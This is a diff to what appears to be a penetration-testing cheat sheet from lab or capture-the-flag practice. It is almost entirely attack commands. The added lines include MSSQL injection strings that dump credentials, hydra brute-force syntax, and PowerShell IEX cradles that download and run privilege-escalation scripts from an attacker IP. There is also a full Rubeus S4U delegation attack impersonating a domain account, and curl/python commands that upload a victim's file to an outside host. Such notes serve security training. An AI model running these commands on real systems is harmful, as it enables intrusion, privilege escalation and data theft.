@@ -12,6 +12,7 @@
     - [App](#app)
     - [subdomain](#subdomain)
     - [dir](#dir)
+    - [WordPress](#wordpress)
     - [endpoint](#endpoint)
 - [Initial Access](#initial-access)
   - [Path Traversal](#path-traversal)
@@ -48,17 +49,19 @@
     - [PowerView](#powerview)
     - [winPEAS](#winpeas)
     - [token](#token)
+    - [Sherlock](#sherlock)
+    - [PrivescCheck](#privesccheck)
     - [BloodHound](#bloodhound)
   - [Linux](#linux-1)
     - [cmd](#cmd)
     - [linpeas](#linpeas)
+    - [pspy](#pspy)
 - [Privilege Escalation](#privilege-escalation)
   - [Windows](#windows-4)
     - [PowerUp](#powerup)
     - [LOLBIN](#lolbin)
     - [token](#token-1)
-    - [Sherlock](#sherlock)
-    - [PrivescCheck](#privesccheck)
+    - [S4U](#s4u)
   - [Linux](#linux-2)
     - [SUGGEST](#suggest)
     - [/etc/passwd](#etcpasswd)
@@ -68,6 +71,7 @@
     - [Chisel](#chisel)
   - [SMB](#smb-1)
   - [FTP](#ftp)
+- [HTTP](#http)
 - [Tips](#tips)
   - [list](#list)
   - [Metasploit](#metasploit)
@@ -157,6 +161,12 @@ gobuster dir -w /usr/share/wordlists/dirb/common.txt -k -x aspx,txt,pdf,html,php
 # Dirb
 dirb http://
 ```
+### WordPress
+```bash
+wpscan --url http://192.168.198.244 --enumerate u
+wpscan --url http://192.168.198.244 --enumerate p --plugins-detection aggressive  --plugins-version-detection  aggressive
+```
+
 ### endpoint
 ```bash
 # katana
@@ -229,6 +239,14 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 ### MSSQL
+#### Inject
+```
+test' union select 1,@@version,3,4,5,6--
+test' union select 1,DB_NAME(),3,4,5,6--
+test' union select 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')--
+test' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users--
+```
+#### inLine
 https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
 ```bash
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
@@ -332,7 +350,7 @@ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
 # hydra
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337" rdp://192.168.50.202
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed. Invalid"
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:F=Login failed"
 ```
 ## hashcrack
 ```bash
@@ -464,11 +482,20 @@ iwr -Uri http:// -Outfile winPEASany.exe
 # on powershell
 iwr -Uri http:// -Outfile winPEAS.bat
 ```
-
 ### token
 ```powershell
 Import-Module NtObjectManager
 Get-NtTokenIntegrityLevel
+```
+### Sherlock
+https://github.com/rasta-mouse/Sherlock
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
+```
+### PrivescCheck
+https://github.com/itm4n/PrivescCheck
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
 ```
 
 ### BloodHound
@@ -502,6 +529,10 @@ find / -iname "*admin*" 2>/dev/null
 ```bash
 cd /usr/share/peass/linpeas
 ```
+### pspy
+```bash
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+```
 
 # Privilege Escalation
 ## Windows
@@ -510,6 +541,9 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 ```powershell
 cd /usr/share/windows-resources/powersploit/Privesc/
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')
+
+# AllChecks
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1'); Invoke-AllChecks
 
 # john Password123!
 
@@ -536,7 +570,6 @@ shutdown /r /t 0
 schtasks /query /fo LIST /v
 Get-ScheduledTask
 ```
-
 ### token
 ```powershell
 # PrintSpoofer
@@ -553,15 +586,29 @@ cd /usr/share/windows-resources/binaries/
 .\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
 .\SharpToken.exe add_user admin Abcd1234! Administrators
 ```
-### Sherlock
-https://github.com/rasta-mouse/Sherlock
+#### Full Power
+https://github.com/itm4n/FullPowers
+### S4U
+https://github.com/Kevin-Robertson/Powermad
+<br/>
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
+
 ```powershell
-IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
-```
-### PrivescCheck
-https://github.com/itm4n/PrivescCheck
-```powershell
-IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Powermad.ps1')
+
+New-MachineAccount -MachineAccount TEST -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose 
+
+Get-DomainComputer TEST
+
+$ComputerSid = Get-DomainComputer TEST -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer TEST | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+
+.\Rubeus.exe hash /user:TEST$ /password:123456 /domain:authority.htb
+.\Rubeus.exe s4u /user:TEST$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:svc_ldap /msdsspn:cifs/TEST.authority.htb /ptt
 ```
 
 ## Linux
@@ -620,7 +667,6 @@ impacket-smbserver work /root/work -smb2support
 
 xcopy Win32\* \\FILE04\c$\Windows\Temp\ /s /e
 ```
-
 ## FTP
 ```bash
 # passive mode
@@ -630,6 +676,11 @@ passive
 bin
 # text
 ascii
+```
+# HTTP
+```bash
+python3 -c "import requests;requests.post(\"http://10.10.14.68:8000/upload\",files={\"files\":open(\"/home/lnorgaard/RT30000.zip\",\"rb\")})"
+curl -X POST http://10.10.14.68:8000/upload -F 'files=@/home/lnorgaard/RT30000.zip'
 ```
 
 
